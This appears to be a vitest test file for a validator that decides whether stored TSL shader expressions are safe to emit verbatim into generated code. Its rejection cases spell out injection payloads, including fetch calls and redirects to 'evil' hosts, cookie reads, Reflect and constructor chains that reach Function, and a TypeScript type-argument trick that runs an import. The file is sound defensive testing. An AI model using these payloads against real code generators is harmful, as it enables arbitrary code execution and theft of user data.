/**
 * The `unknown`-node expression validator — the security control that decides
 * whether a stored `rawExpression` may be emitted VERBATIM into the generated
 * module (see the module's own header for the threat model).
 *
 * Two properties are pinned here:
 *   · what the validator accepts and rejects, and
 *   · that an UNVALIDATED expression is never accepted — the parser is loaded
 *     on demand now (to keep @babel/* off the boot payload), and the cold
 *     answer must be `false`, not "assume it's fine until we know".
 */

import { describe, it, expect, beforeAll, afterAll, vi } from 'vitest';
import { parseExpression } from '@babel/parser';
import type { Node } from '@babel/types';
import {
  MAX_UNKNOWN_REFS,
  isSafeUnknownExpression,
  loadUnknownExpressionValidator,
  rebindUnknownExpression,
  unknownCallRefNames,
  unknownRefSlots,
} from './unknownExpression';

beforeAll(() => loadUnknownExpressionValidator());

describe('isSafeUnknownExpression — pure data/TSL expressions pass', () => {
  it.each([
    'saturate(1, 2, 3)',
    'saturate(vec3(1, 2, 3), 0.5)',
    'saturate(positionLocal.mul(2.0))',
    'saturate(uv().x, -1.0)',
    'saturate(vec3(1).mul(2).add(3))',
    'saturate([1, 2], "srgb", !time)',
    'mx_noise_float(positionLocal.xyz.toVar(), 2)',
    'fwidth(normalWorld.rgb.mul(cameraPosition.z))',
  ])('accepts %s', (expr) => {
    expect(isSafeUnknownExpression(expr)).toBe(true);
  });

  it('reads another name only when the module declares it', () => {
    expect(isSafeUnknownExpression('saturate(a, b.x)')).toBe(false);
    expect(isSafeUnknownExpression('saturate(a, b.x)', (n) => n === 'a')).toBe(false);
    expect(isSafeUnknownExpression('saturate(a, b.x)', (n) => n === 'a' || n === 'b')).toBe(true);
  });
});

describe('isSafeUnknownExpression — anything that could execute is rejected', () => {
  it.each([
    ['IIFE argument', 'saturate((() => { window.location = "http://evil/" })())'],
    ['fetch in argument', 'saturate(fetch("http://evil"))'],
    ['bare eval call', 'eval("alert(1)")'],
    ['forbidden global in argument', 'saturate(window.document.cookie)'],
    ['member-expression callee', 'window.fetch("http://evil")'],
    ['statement list', 'saturate(); fetch("http://evil")'],
    ['assignment in argument', 'saturate(window.name = "x")'],
    ['computed property access', 'saturate(self["eval"]("x"))'],
    ['not a call at all', 'positionLocal'],
    ['new expression', 'saturate(new Worker("x"))'],
    ['template literal', 'saturate(`${a}`)'],
    ['spread argument', 'saturate(...args)'],
    ['sequence operator', 'saturate((a, b))'],
    ['unparseable', 'saturate(('],
    ['prototype hop', 'saturate(x.constructor)'],
  ])('rejects %s', (_label, expr) => {
    expect(isSafeUnknownExpression(expr)).toBe(false);
  });

  // The deny-list these replaced let every one of these through (review
  // 2026-10-27: the first ran `globalThis.__pwned = 1`). Each is refused even
  // when every name it READS counts as declared — the member and callee
  // allow-lists alone close them.
  const everything = () => true;
  it.each([
    ['Reflect reaching Function', "float(Reflect.apply(Reflect.apply(Reflect.get(float, 'constructor'), null, ['globalThis.__pwned = 1']), null, []))"],
    ['a concatenated key', "saturate(Reflect.get(float, 'constr' + 'uctor'))"],
    ['a property descriptor', "saturate(Object.getOwnPropertyDescriptor(Object.getPrototypeOf(float), 'constructor').value)"],
    ['Function.prototype methods', 'saturate(float.call.bind)'],
    ['a global that is no TSL function', 'fetchLater("https://evil.example/")'],
    ['a made-up callee', 'mysteryFn(1, 2, 3)'],
    ['a TSL export that calls a JS function', 'saturate(Fn(print))'],
    ['a TSL export that reads a property path', "saturate(reference('constructor.constructor', 'float', float))"],
    ['TSL raw source', "saturate(js('globalThis.__pwned = 1'))"],
  ])('rejects %s', (_label, expr) => {
    expect(isSafeUnknownExpression(expr, everything)).toBe(false);
  });

  // `f<T>(x)` is a call with type arguments to TypeScript and two comparisons
  // to JavaScript — `(f < import(…)) > x` — which RUNS the import. The text is
  // run as JS, so it is parsed as JS (and a TS-parsed AST's type arguments are
  // refused by the walker: unknownCallRefNames below).
  it.each([
    'float<import("data:text/javascript,globalThis.__pwned=1")>(1)',
    'saturate<T>(1)',
    'saturate(float<import("x")>(1))',
  ])('rejects the TypeScript type-argument form %s', (expr) => {
    expect(isSafeUnknownExpression(expr, everything)).toBe(false);
  });
});

describe('unknownCallRefNames — the parse side of the same walker', () => {
  const ts = (expr: string) => parseExpression(expr, { plugins: ['typescript'] }) as unknown as Node;

  it('collects every name READ, in source order, deduped — never a callee or a member name', () => {
    expect(unknownCallRefNames(ts('saturate(a, a.x, max(a, 1), "a", b.x.y)'))).toEqual(['a', 'b']);
  });

  it('binds nothing in a call graphToCode would not emit', () => {
    expect(unknownCallRefNames(ts('saturate<T>(a)'))).toBeNull();
    expect(unknownCallRefNames(ts('saturate(float<import("x")>(a))'))).toBeNull();
    expect(unknownCallRefNames(ts('mysteryFn(a)'))).toBeNull();
    expect(unknownCallRefNames(ts('saturate(a.call)'))).toBeNull();
  });
});

describe('rebindUnknownExpression — only the READ tokens move', () => {
  const to = new Map([['a', 'float1']]);

  it('leaves a member name, a callee, a string and a comment alone', () => {
    expect(rebindUnknownExpression('saturate(a, a.a, max(a, 1), "a", b.a.x) /* a */', to))
      .toBe('saturate(float1, float1.a, max(float1, 1), "a", b.a.x) /* a */');
  });

  it('keeps every line break where it was (CRLF, comments) and reads Unicode names', () => {
    expect(rebindUnknownExpression('saturate(\r\n  a, // a\r\n  max(a.y, 2)\r\n)', to))
      .toBe('saturate(\r\n  float1, // a\r\n  max(float1.y, 2)\r\n)');
    expect(rebindUnknownExpression('saturate(krāsa, 2)', new Map([['krāsa', 'float1']]))).toBe('saturate(float1, 2)');
  });

  it('refuses an unsafe text, and leaves the rewrite to be validated again', () => {
    expect(rebindUnknownExpression('saturate(fetch(a))', to)).toBeNull();
    // A substitution is emitter text, but the caller still validates the result.
    const landed = rebindUnknownExpression('saturate(a)', new Map([['a', 'top']]));
    expect(landed).toBe('saturate(top)');
    expect(isSafeUnknownExpression(landed!, () => true)).toBe(false);
  });
});

describe('unknownRefSlots — `values.refs` is adversarial', () => {
  it('a repeated or invalid name keeps its POSITIONAL slot without shifting the others', () => {
    expect(unknownRefSlots({ refs: 'a a b"c d' })).toEqual([
      { name: 'a', handle: 'ref0' },
      { name: 'd', handle: 'ref3' },
    ]);
  });

  it('at most MAX_UNKNOWN_REFS slots; anything but a string is no list', () => {
    const many = Array.from({ length: 100 }, (_, i) => `n${i}`).join(' ');
    const slots = unknownRefSlots({ refs: many });
    expect(slots).toHaveLength(MAX_UNKNOWN_REFS);
    expect(slots[slots.length - 1]).toEqual({ name: `n${MAX_UNKNOWN_REFS - 1}`, handle: `ref${MAX_UNKNOWN_REFS - 1}` });
    expect(unknownRefSlots({ refs: ['a'] as unknown as string })).toEqual([]);
    expect(unknownRefSlots({ refs: 'x'.repeat(5000) })).toEqual([]);
    expect(unknownRefSlots({})).toEqual([]);
  });
});

describe('the validator fails CLOSED before its parser has loaded', () => {
  // A fresh module instance is the only way to observe the cold state: the
  // parser reference and the verdict cache are module-scope, and this worker
  // shares module instances across files (vite.config.ts `isolate: false`).
  afterAll(() => { vi.resetModules(); });

  it('rejects an expression it has not actually parsed, then accepts it once it can', async () => {
    vi.resetModules();
    const cold = await import('./unknownExpression');
    expect(cold.isSafeUnknownExpression('saturate(1, 2, 3)')).toBe(false);
    // A cold rebind is no rewrite either — and is not remembered as one.
    expect(cold.rebindUnknownExpression('saturate(a)', new Map([['a', 'b']]))).toBeNull();
    await cold.loadUnknownExpressionValidator();
    expect(cold.isSafeUnknownExpression('saturate(1, 2, 3)')).toBe(true);
    expect(cold.rebindUnknownExpression('saturate(a)', new Map([['a', 'b']]))).toBe('saturate(b)');
    // A fail-closed answer must not have been cached, and a real one must be.
    expect(cold.isSafeUnknownExpression('eval("x")')).toBe(false);
  });

  it('tells subscribers when the parser lands, so a producer can re-run', async () => {
    vi.resetModules();
    const cold = await import('./unknownExpression');
    const seen: number[] = [];
    const off = cold.onUnknownExpressionValidated(() => seen.push(1));
    // Only a COLD miss arms the notification — that is the case where an
    // already-emitted module is holding fallbacks.
    expect(cold.isSafeUnknownExpression('saturate(1)')).toBe(false);
    await cold.loadUnknownExpressionValidator();
    await Promise.resolve();
    expect(seen.length).toBeGreaterThan(0);
    off();
  });
});
